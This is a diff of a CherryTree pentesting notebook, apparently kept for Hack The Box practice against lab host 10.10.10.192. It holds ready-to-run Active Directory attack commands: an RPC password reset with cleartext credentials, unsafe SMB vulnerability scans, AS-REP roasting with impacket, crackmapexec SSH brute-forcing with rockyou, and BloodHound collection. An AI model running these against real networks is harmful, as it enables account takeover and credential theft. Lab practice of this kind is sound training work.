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</encoded_png>
+        <codebox char_offset="165" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"> net rpc password "AUDIT2020" "jack@1234" -U "BLACKFIRLD.LOCAL"/"support"%"#00^BlackKnight" -S "10.10.10.192"</codebox>
       </node>
     </node>
     <node name="Exploitation" unique_id="22" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="0" custom_icon_id="22" is_bold="0" foreground="" ts_creation="0" ts_lastsave="1500474629">
@@ -1388,7 +1890,7 @@ _____________________________________
         <codebox char_offset="7" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">nikto -host 10.10.10.192 | tee output.log</codebox>
         <codebox char_offset="24" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">nikto -host 10.10.10.192 -port [port number 1], [port number 2], [port number 3]</codebox>
       </node>
-      <node name="smb" unique_id="34" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687626207" ts_lastsave="1697746756">
+      <node name="smb" unique_id="34" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687626207" ts_lastsave="1698803017">
         <rich_text scale="h1">Nmap</rich_text>
         <rich_text>
 
@@ -1513,7 +2015,7 @@ Also check
         <codebox char_offset="27" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">nmap --script smb-enum-shares -p 139,445 10.10.10.192</codebox>
         <codebox char_offset="42" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">nmap --script=smb-vuln* --script-args=unsafe=1 -T5 10.10.10.192</codebox>
         <codebox char_offset="90" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">smbclient -N -L 10.10.10.192   </codebox>
-        <codebox char_offset="133" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">smbclient //10.10.10.192/directoryName -U &lt;username&gt;
+        <codebox char_offset="133" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">smbclient //10.10.10.192/profiles$ -U &lt;username&gt;
 
 recurse ON
 prompt OFF
@@ -1647,7 +2149,7 @@ crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq</code
           <codebox char_offset="198" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="plain-text" highlight_brackets="1" show_line_numbers="0">
 
 </codebox>
-          <node name="ASRreproasting" unique_id="90" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687808714" ts_lastsave="1687808763">
+          <node name="ASRreproasting" unique_id="90" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687808714" ts_lastsave="1698800929">
             <rich_text scale="h1">Request AS_REP message</rich_text>
             <rich_text>
 
@@ -1668,9 +2170,9 @@ or
 
 </rich_text>
             <codebox char_offset="41" justification="left" frame_width="1810" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">#Try all the usernames in usernames.txt
-python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
+impacket-GetNPUsers  jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast -dc-ip 10.10.10.192
 #Use domain creds to extract targets and target them
-python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
+python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast -dc-ip 10.10.10.192
 
 or
 
@@ -2402,7 +2904,7 @@ crackmapexec smb 10.10.10.192 -u admin -p abcd1234 --shares</codebox>
           <codebox char_offset="634" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec ldap 10.10.10.192 -u &lt;username&gt; -p &lt;password&gt; --kdcHost 10.10.10.192 -M laps</codebox>
           <codebox char_offset="687" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec ssh 10.10.10.192 -u patrick -p /usr/share/wordlists/rockyou.txt</codebox>
         </node>
-        <node name="Using Bloodhound" unique_id="44" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690408" ts_lastsave="1696645243">
+        <node name="Using Bloodhound" unique_id="44" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690408" ts_lastsave="1698804186">
           <rich_text scale="h3">Upload sharphound and run the following if u are on a non domain joined system in powershell</rich_text>
           <rich_text>
 
@@ -2521,7 +3023,7 @@ Import-Module ./SharpHound.ps1&#13;
 Invoke-Bloodhound -collectionmethod all -domain htb.local -ldapuser svc-alfresco -ldappass s3rvice</codebox>
           <codebox char_offset="719" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">sudo apt install bloodhound.py</codebox>
           <codebox char_offset="729" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">bloodhound-python --dns-tcp -ns 10.10.10.192 -d support.htb -u ‘ldap’ -p ‘password’</codebox>
-          <codebox char_offset="737" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">bloodhound-python --dns-tcp -c all  -u 'svc-alfresco' -p 's3rvice' -ns 10.10.10.192 -d htb.local -gc forest.htb.local</codebox>
+          <codebox char_offset="737" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">bloodhound-python --dns-tcp -c all  -u 'support' -p 's3rvice' -ns 10.10.10.192 -d htb.local -gc forest.htb.local</codebox>
           <codebox char_offset="803" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">bloodhound-python --dns-tcp -ns 10.10.10.192 -d support.htb -u ‘ldap’ -p ‘password’ -c all</codebox>
           <codebox char_offset="1042" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">sudo bloodhound</codebox>
           <codebox char_offset="1072" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">sudo neo4j console</codebox>
